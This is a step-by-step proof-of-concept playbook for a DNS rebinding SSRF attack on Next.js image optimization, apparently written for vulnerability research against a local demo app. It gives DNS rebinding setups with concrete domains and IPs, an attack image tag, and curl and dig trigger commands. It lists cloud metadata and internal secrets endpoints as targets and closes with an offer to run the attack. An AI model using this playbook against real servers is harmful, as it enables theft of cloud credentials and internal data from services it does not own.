# DNS Rebinding SSRF Attack - Complete Scenario

## Overview
**Vulnerability:** TOCTOU DNS Rebinding in Next.js Image Optimization
**Location:** `packages/next/src/server/image-optimizer.ts` lines 716-741

## Attack Scenario

**Attacker:** Controls DNS for `ssrf.werz.xyz`
**Victim:** Any user visiting a page with an image from the attacker's domain

---

## STEP 1: DNS CONFIGURATION

Configure DNS for `ssrf.werz.xyz` with a **DNS rebinding server**.

### Option A: Using Your Own DNS Server
Set up a DNS server that alternates responses:
- Query 1: Returns `91.99.139.110` (public IP) → passes isPrivateIp() check
- Query 2: Returns `127.0.0.1` (internal) → fetch() hits localhost

### Option B: Simpler Test (Cloudflare/Your DNS Panel)
Create two A records for the same subdomain:
```
ssrf.werz.xyz  A  91.99.139.110  TTL=1
ssrf.werz.xyz  A  127.0.0.1      TTL=1
```
DNS round-robin will alternate between them.

### Option C: Using Public Rebinding Service
Use `rbndr.us`:
```
7f000001.5b636e6e.rbndr.us  alternates between 127.0.0.1 and 91.99.139.110
```
(But this requires adding rbndr.us to remotePatterns)

---

## STEP 2: VICTIM SETUP

The "victim" is a Next.js app with external images allowed in `next.config.ts`:
```typescript
images: {
  remotePatterns: [
    { protocol: 'http', hostname: '*.werz.xyz', pathname: '/**' }
  ]
}
```

This is your demo app at http://localhost:3000

---

## STEP 3: THE ATTACK

### Attack Page (what attacker serves)
The attacker creates a webpage at `http://ssrf.werz.xyz/` that contains:
```html
<img src="http://victim-nextjs-app.com/_next/image?url=http://ssrf.werz.xyz/image.png&w=100&q=75">
```

When the victim's browser loads this image:
1. Next.js server does DNS lookup for `ssrf.werz.xyz` → gets `91.99.139.110`
2. Passes `isPrivateIp()` check
3. `fetch()` does its own DNS lookup → gets `127.0.0.1` (due to round-robin/rebinding)
4. **Fetch hits localhost:80** instead of the intended external server!

---

## STEP 4: SSRF TARGET

What can the attacker access?
- **Cloud metadata:** `http://169.254.169.254/latest/meta-data/` (AWS)
- **Internal APIs:** `http://localhost:8080/admin`
- **Other containers:** `http://internal-service:3000/api/secrets`

---

## Quick Test Commands

After DNS is configured:
```bash
# Verify DNS is alternating
for i in {1..5}; do dig +short ssrf.werz.xyz; done

# Trigger the attack
curl "http://localhost:3000/_next/image?url=http://ssrf.werz.xyz/&w=64&q=75"
```

---

## What You Need To Do Now

1. Go to your DNS panel for werz.xyz
2. Create subdomain: `ssrf.werz.xyz`
3. Add TWO A records:
   - `91.99.139.110` (your public IP, or any public IP)
   - `127.0.0.1` (the SSRF target)
4. Set TTL to lowest possible (1 second ideally)
5. Tell me when done and I'll run the attack
